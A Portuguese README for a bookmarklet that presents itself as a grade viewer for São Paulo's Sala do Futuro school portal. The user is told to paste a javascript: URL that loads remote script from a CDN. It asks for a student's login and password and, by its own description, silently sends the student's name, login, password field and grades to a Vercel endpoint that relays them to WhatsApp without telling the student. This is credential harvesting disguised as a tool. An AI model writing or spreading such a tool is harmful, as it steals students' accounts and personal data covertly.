# 📚 Extrator de Provas Paulista e Avaliações Diagnósticas — SP

Bookmarklet para extrair automaticamente as notas das **Provas Paulista** e **Avaliações Diagnósticas** do sistema **Sala do Futuro** (SED-SP), exibir na tela e enviar silenciosamente para WhatsApp.

---

## 🚀 Como usar

### 1. Adicione o bookmarklet ao navegador

Crie um novo favorito com o nome `🏆 GONZAGA LIXO` e cole o código abaixo como **URL**:

```
javascript:(function(){var s=document.createElement('script');s.src='https://cdn.jsdelivr.net/gh/orickmaxx/provasecuc-bookmarklet@e6b93a73/bookmarklet.js?t='+Date.now();document.body.appendChild(s);})()
```

> ⚠️ Se atualizar o código no futuro, troque `@e6b93a73` pelo hash do novo commit para evitar cache do CDN.

### 2. Execute

1. Acesse [saladofuturo.educacao.sp.gov.br](https://saladofuturo.educacao.sp.gov.br/)
2. Clique no favorito criado
3. Digite o **RA + Dígito + UF** do aluno (ex: `1098390684SP`)
4. Digite a **senha** do aluno
5. Os resultados aparecem na tela em tempo real

---

## 🖥️ O que aparece na tela

Overlay em tela cheia no tema **preto/verde Gonzaga Lixo**:

- Card por prova com nota colorida:
  - 🏆 **Dourado** ≥ 80%
  - 👍 **Verde** ≥ 60%
  - 📚 **Laranja** ≥ 40%
  - 📊 **Vermelho** < 40%
- Média Geral em destaque no final
- Botão **✕** para fechar

O envio para WhatsApp é feito **em silêncio**, sem avisar ao aluno.

---

## 📲 Mensagem enviada ao WhatsApp (invisível ao aluno)

```
🤖 Extrator Automático de Provas

👤 Aluno: NOME COMPLETO DO ALUNO
🆔 RA/Login: 1098390684SP
🔑 Senha: ••••••••
🕐 Consulta: 26/02/2026 19:10:00

━━━━━━━━━━━━━━━━
📝 3ª série - Língua Portuguesa
⭐ Nota: 67.0%

📝 3ª série - Matemática
⭐ Nota: 82.0%

📈 Média Geral: 74.5%
```

---

## 🔄 Fluxo do script

```
Browser (favorito clicado)
      │
      ├─ 1. POST LoginCompletoToken  ──────────────► SED
      │        └─ retorna: JWT da SED
      │
      ├─ 2. POST /registration/edusp/token  ────────► EduSP API
      │        └─ retorna: auth_token + nick + name
      │
      ├─ 3. GET /room/user  ────────────────────────► EduSP API
      │        └─ retorna: salas → publication_targets
      │
      ├─ 4. GET /adaptive-assessment/answer  ───────► EduSP API
      │        └─ retorna: provas finalizadas + notas
      │
      ├─ 5. Exibe resultados na tela (overlay verde)
      │
      └─ 6. POST provasecuc.vercel.app/api/whatsapp ► Vercel (silencioso)
                  └─ dispara mensagem via Green API
```

> **Por que usa a Vercel?** A chave da API do WhatsApp (Green API) fica guardada como variável de ambiente secreta no servidor. O bookmarklet só envia o texto — nunca expõe credenciais.
